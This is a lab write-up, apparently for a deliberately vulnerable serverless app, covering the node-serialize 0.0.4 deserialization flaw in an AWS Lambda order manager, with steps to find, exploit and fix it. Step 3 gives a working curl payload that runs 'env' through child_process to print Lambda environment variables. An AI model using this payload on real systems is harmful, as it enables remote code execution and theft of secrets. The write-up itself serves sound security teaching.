# Lesson 9 · Vulnerable Dependencies

## Vulnerability Summary
`DVSA-ORDER-MANAGER` depends on `node-serialize` (v0.0.4), a package with a **known Critical RCE vulnerability** (no patch available). This package is applied directly to attacker-controlled API input, turning a dependency problem into **live remote code execution**.

## Root Cause
The `package.json` includes `node-serialize: "0.0.4"`, which has a [publicly documented vulnerability](https://nodesecurity.io/advisories/311) allowing code execution through IIFE payloads. The dangerous pattern:
```javascript
var req = serialize.unserialize(event.body);      // RCE via user input
var headers = serialize.unserialize(event.headers); // RCE via user input
```
Attacker-controlled data is passed directly to a code-executing library.

## Packages Identified
| Package | Version | Risk |
|---------|---------|------|
| `node-serialize` | `0.0.4` | **Critical** — Code Execution through IIFE |
| `node-jose` | `2.2.0` | High — JWT processing (used in auth path) |

## AWS Components
| Component | Role |
|-----------|------|
| Lambda (DVSA-ORDER-MANAGER) | Contains vulnerable `node-serialize` |
| API Gateway `/order` | Public entry point reachable by attackers |
| CloudWatch Logs | Evidence of execution |

## Tools Used
- AWS Lambda Console (code editor)
- `npm audit`
- `curl`
- CloudWatch Logs

## Reproduction Steps

### Step 1 — Inspect the Code
Open `DVSA-ORDER-MANAGER` in Lambda Console and view `package.json`:
```json
{
  "dependencies": {
    "node-jose": "2.2.0",
    "node-serialize": "0.0.4"
  }
}
```

### Step 2 — Identify the Dangerous Usage
In `order-manager.js`:
```javascript
const serialize = require('node-serialize');   // line 1 — DANGEROUS
// ...
var req = serialize.unserialize(event.body);   // line 10 — RCE entry point
var headers = serialize.unserialize(event.headers); // line 11 — RCE entry point
```

### Step 3 — Exploit (same as Lesson 1)
```bash
curl -X POST https://<API-ID>.execute-api.us-east-1.amazonaws.com/Stage/order \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"action":"_$$ND_FUNC$$_function(){
    require(\"child_process\").exec(\"env\", function(e,o){ console.log(o); });
  }()", "cart-id":""}'
```

CloudWatch logs will show the Lambda environment variables printed — confirming RCE.

### Step 4 — Run npm audit (after fix)
```bash
npm audit
# Should show: found 0 vulnerabilities
```

## Evidence
`npm audit` on the original `package.json` reports:
```
Critical  Code Execution through IIFE
Package   node-serialize
Patched in  No patch available
More info   https://nodesecurity.io/advisories/311
```

## Fix Summary

**Step 1 — Remove from `package.json`:**
```json
{
  "dependencies": {
    "node-jose": "^2.2.0",
    "@aws-sdk/client-lambda": "^3.0.0"
  }
}
```

**Step 2 — Replace in `order-manager.js`:**
```javascript
// BEFORE (vulnerable):
const body = serialize.unserialize(event.body);

// AFTER (safe):
const body = JSON.parse(event.body);
```

**Step 3 — Pin and audit dependencies continuously:**
```bash
npm audit
npm audit fix
```

See [`/Codefix/Lesson09-Vulnerable-Dependencies/`](../../Codefix/Lesson09-Vulnerable-Dependencies/) for the cleaned `package.json` and updated handler.

## Lessons Learned
Dependencies are not background details — they can become the **real attack surface**. The danger here wasn't that the package existed, but that it was **directly reachable from public API input**. Treat all external input as untrusted data, minimize third-party risk, and continuously scan all dependencies.
